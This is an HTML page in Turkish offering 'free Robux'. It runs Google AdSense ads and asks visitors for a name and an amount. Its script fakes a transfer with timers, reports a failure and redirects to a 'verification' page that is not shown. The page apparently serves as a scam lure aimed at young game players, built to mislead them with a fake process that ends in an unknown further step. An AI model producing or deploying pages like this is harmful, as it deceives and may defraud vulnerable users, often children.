<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<title>ÜCRETSİZ ROBUX 💎</title>
<link rel="icon" href="logo.png" type="image/png">

<!-- Google AdSense -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9272463357075503"
crossorigin="anonymous"></script>

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background: linear-gradient(135deg,#0f0f0f,#2e2e2e);
    font-family:Segoe UI;
    color:white;
}
.box{
    background:#1b1b1b;
    padding:60px;
    border-radius:20px;
    width:420px;
    text-align:center;
    box-shadow:0 20px 50px rgba(0,0,0,0.6);
}
h1{ font-size:34px; margin-bottom:35px; }
input{
    width:85%; padding:12px; margin-top:10px; border-radius:10px;
    border:none; background:#2c2c2c; color:white;
}
button{
    margin-top:35px; padding:14px 40px; font-size:20px;
    border:none; border-radius:12px;
    background:linear-gradient(135deg,#4facfe,#00f2fe);
    color:white; cursor:pointer;
}
#mesaj{ margin-top:20px; font-size:18px; }
</style>
</head>

<body>

<div class="box">
<h1>ÜCRETSİZ ROBUX 💎</h1>

<input type="text" id="ad" placeholder="Adınız">
<input type="number" id="miktar" placeholder="Miktar (Max 500)" max="500">

<br>
<button onclick="gonder()">Gönder</button>

<div id="mesaj"></div>
</div>

<script>
function gonder(){
    let ad = document.getElementById("ad").value;
    let miktar = document.getElementById("miktar").value;

    if(ad=="" || miktar==""){
        document.getElementById("mesaj").innerHTML="Lütfen tüm alanları doldurun ❌";
        return;
    }

    document.getElementById("mesaj").innerHTML="Gönderiliyor...";

    setTimeout(function(){
        document.getElementById("mesaj").innerHTML="Gönderim Başarısız ❌ Lütfen adımları takip edin.";
        setTimeout(function(){
            // Statik sayfaya yönlendirme
            window.location.href = "l-dogrulamasayfasi.html";
        }, 3000);
    },5000);
}
</script>

</body>
</html>
